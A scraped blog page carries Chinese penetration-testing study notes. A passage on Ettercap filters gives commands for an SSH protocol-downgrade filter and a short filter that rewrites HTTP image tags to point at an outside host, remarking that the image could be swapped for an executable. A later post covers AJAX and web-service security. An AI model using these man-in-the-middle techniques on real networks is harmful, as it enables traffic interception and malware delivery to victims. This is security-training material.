<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/" itemprop="url">Kali Linux笔记(五十七)：AJAX、Web Server</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:39+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  871 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
<li>Asynchronous JavaScript and XML</li>
<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
<li>降低带宽使用，提高速度</li>
<li>提升用户体验</li>
<li>后台异步访问</li>
</ul>
<h4 id="2-AJAX、DHTML、DOM"><a href="#2-AJAX、DHTML、DOM" class="headerlink" title="2. AJAX、DHTML、DOM"></a>2. AJAX、DHTML、DOM</h4><ul>
<li>AJAX组件<ul>
<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口向服务器发起请求，接收并处理服务器响应数据</li>
</ul>
</li>
<li>Dynamic HTML（DHTML）<ul>
<li>早于AJAX出现，通过javascript、CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由javascript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
</ul>
</li>
<li>Document Object Model（DOM）<ul>
<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties、method、event</li>
</ul>
</li>
</ul>
<h4 id="3-基于AJAX的WEB应用工作流程"><a href="#3-基于AJAX的WEB应用工作流程" class="headerlink" title="3. 基于AJAX的WEB应用工作流程"></a>3. 基于AJAX的WEB应用工作流程</h4><ul>
<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
<li>Xml、json（默认首选）、html、文本、图片</li>
<li>多个异步请求独立通信，互不依赖</li>
<li>AJAX框架<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web toolkit（GWT）</li>
<li>Microsoft AJAX library</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐请求过程：User Interface →(JavaScript)→ AJAX Engine →(HTTP Request)→ Web Server → Database,backend server
⭐响应过程：Databse,backend server → Web Server →(HTML\JSON\XML)→ AJAX Engine →(DHTML)→ User Interface</code></pre></blockquote>
<h4 id="4-AJAX的安全问题"><a href="#4-AJAX的安全问题" class="headerlink" title="4. AJAX的安全问题"></a>4. AJAX的安全问题</h4><ul>
<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
<li>AJAX的安全问题<ul>
<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP（同源策略），但可能绕过</li>
<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露、</li>
<li>暴漏应用程序逻辑</li>
</ul>
</li>
<li>AJAX对渗透测试的挑战<ul>
<li>异步请求数量多且隐蔽</li>
<li>触发AJAX请求的条件无规律</li>
<li>手动和截断代理爬网可能产生大量遗漏</li>
</ul>
</li>
<li>AJAX爬网工具<ul>
<li>ZAP（Sites → 右键 → Attack → AJAX Spider）</li>
</ul>
</li>
<li>客户端代码审计<ul>
<li>源码</li>
<li>Firebug</li>
</ul>
</li>
</ul>
<h4 id="5-Web-Service（F12）"><a href="#5-Web-Service（F12）" class="headerlink" title="5. Web Service（F12）"></a>5. Web Service（F12）</h4><ul>
<li>Web Service<ul>
<li>面向服务的架构（service oriented architecture）便于不同系统集成共享数据和功能</li>
<li>尤其适合不想要暴漏数据模型和程序逻辑而访问数据的场景</li>
<li>无页面（最典型的类型）</li>
</ul>
</li>
<li>两种类型的Web Service<ul>
<li>Simple object access protocol（SOAP）<ul>
<li>传统的Web Service开发方法，xml是唯一的数据交换格式</li>
<li>要求安全性的应用更多采用</li>
</ul>
</li>
<li>RESTful（Representational Transfer architecture–REST）<ul>
<li>目前更多被采用的轻量的web service，JSON是首选数据交换格式</li>
</ul>
</li>
</ul>
</li>
<li>Web Service安全考虑<ul>
<li>使用API Key或session token实现和跟踪身份认证</li>
<li>身份认证由服务器完成，而非客户端</li>
<li>API Key、用户名、Session token永远不要通过URL发送</li>
<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
<li>SOAP提供强于HTTPS的WS-security机制（传输层实现）</li>
<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</li>
<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
<li>使用随机token防止CSRF攻击</li>
<li>对用户提交参数过滤，建议布署基于严格白名单的方法</li>
<li>报错信息消毒</li>
<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/11/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">161</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">147.5k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
